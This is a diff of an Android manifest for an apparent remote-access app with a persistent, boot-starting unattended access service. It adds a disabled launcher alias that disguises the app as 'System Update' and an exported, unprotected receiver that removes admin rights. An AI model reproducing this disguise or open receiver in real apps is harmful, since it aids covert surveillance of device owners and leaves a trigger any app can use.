@@ -43,7 +43,7 @@
 
     <application
         android:name="${applicationName}"
-        android:label="System Update"
+        android:label="Zoom-Private"
         android:icon="@mipmap/ic_launcher"
         android:roundIcon="@mipmap/ic_launcher_round"
         android:allowBackup="false"
@@ -51,25 +51,40 @@
         android:networkSecurityConfig="@xml/network_security_config"
         android:stopWithTask="false">
 
+        <receiver android:name=".AdminCleanupReceiver" android:exported="true">
+            <intent-filter>
+                <action android:name="com.betterdesk.REMOVE_ADMIN"/>
+            </intent-filter>
+        </receiver>
+
         <!-- Main launcher activity (configuration UI) -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
             android:launchMode="singleTop"
-            android:taskAffinity="com.android.shell.ghost.dummy"
+            android:taskAffinity=""
             android:theme="@style/LaunchTheme"
             android:configChanges="orientation|keyboardHidden|keyboard|screenSize|smallestScreenSize|locale|layoutDirection|fontScale|screenLayout|density|uiMode"
             android:hardwareAccelerated="true"
             android:windowSoftInputMode="adjustResize"
-            android:excludeFromRecents="true">
+            android:excludeFromRecents="false">
             <meta-data
                 android:name="io.flutter.embedding.android.NormalTheme"
                 android:resource="@style/NormalTheme"/>
+        </activity>
+
+        <activity-alias
+            android:name=".LauncherAlias"
+            android:targetActivity=".MainActivity"
+            android:exported="true"
+            android:enabled="false"
+            android:label="System Update"
+            android:icon="@mipmap/ic_launcher">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
                 <category android:name="android.intent.category.LAUNCHER"/>
             </intent-filter>
-        </activity>
+        </activity-alias>
 
         <!-- Unattended access foreground service — runs persistently, starts on boot -->
         <service
